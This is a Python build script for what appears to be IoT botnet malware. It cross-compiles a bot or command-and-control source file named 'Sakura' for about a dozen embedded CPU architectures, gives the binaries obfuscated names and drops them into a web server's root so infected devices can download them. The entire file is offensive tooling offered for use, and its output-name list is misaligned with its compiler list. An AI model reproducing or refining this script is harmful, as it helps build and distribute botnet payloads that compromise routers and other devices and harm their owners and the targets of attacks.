import os
import subprocess
import shutil

# Set your bot source file here
bot_source = "cnc.c"  # or "Sakura_Bot.c" if that's your source

# Output names for the binaries
compileas = [
    "m-i.p-s.Sakura", "m-p.s-l.Sakura", "s-h.4-.Sakura", "x-8.6-.Sakura",
    "a-r.m-6.Sakura", "x-3.2-.Sakura", "a-r.m-7.Sakura", "p-p.c-.Sakura",
    "i-5.8-6.Sakura", "m-6.8-k.Sakura", "p-p.c-.Sakura", "a-r.m-4.Sakura", "a-r.m-5.Sakura"
]

# Folders of cross-compilers
ccs = [
    "cross-compiler-mips", "cross-compiler-mipsel", "cross-compiler-sh4",
    "cross-compiler-x86_64", "cross-compiler-armv6l", "cross-compiler-i686",
    "cross-compiler-powerpc", "cross-compiler-i586", "cross-compiler-m68k",
    "cross-compiler-armv7l", "cross-compiler-armv4l", "cross-compiler-armv5l"
]

def run(cmd):
    print(f"[*] Running: {cmd}")
    subprocess.call(cmd, shell=True)

# Create the folder to store compiled files (in case it doesn't exist)
output_folder = "/var/www/html"
if not os.path.exists(output_folder):
    os.makedirs(output_folder)

# Start compiling and move the files
for index, cc in enumerate(ccs):
    try:
        arch = [f for f in os.listdir(f"./{cc}/bin") if f.endswith("gcc")][0].split("-")[0]
        compiler = f"./{cc}/bin/{arch}-gcc"
        output = compileas[index]
        cmd = f"{compiler} -static -pthread -o {output} {bot_source}"
        run(cmd)
        
        # Move compiled file to the web server directory
        shutil.move(output, f"{output_folder}/{output}")
        
    except Exception as e:
        print(f"[!] Error with {cc}: {e}")
